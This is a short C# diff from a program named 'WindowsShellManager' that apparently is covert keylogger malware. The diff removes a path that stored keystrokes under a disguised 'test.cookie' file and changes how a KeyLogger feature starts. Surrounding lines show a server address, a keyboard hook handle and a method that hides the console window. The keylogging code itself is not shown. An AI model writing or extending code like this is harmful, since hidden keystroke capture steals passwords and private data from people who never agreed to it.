@@ -10,7 +10,6 @@ namespace WindowsShellManager
 
         static readonly string server = "127.0.0.1";
         private static IntPtr _hookID = IntPtr.Zero;
-        internal readonly static String filePath = Environment.GetFolderPath(Environment.SpecialFolder.Cookies) + "\\test.cookie";
 
         static void Main(string[] args)
         {
@@ -26,7 +25,7 @@ namespace WindowsShellManager
 
         static void KeyLogger()
         {
-            new features.KeyLogger().Start(filePath);
+            new features.KeyLogger().Start();
         }
 
         public static void HideConsoleWindow()
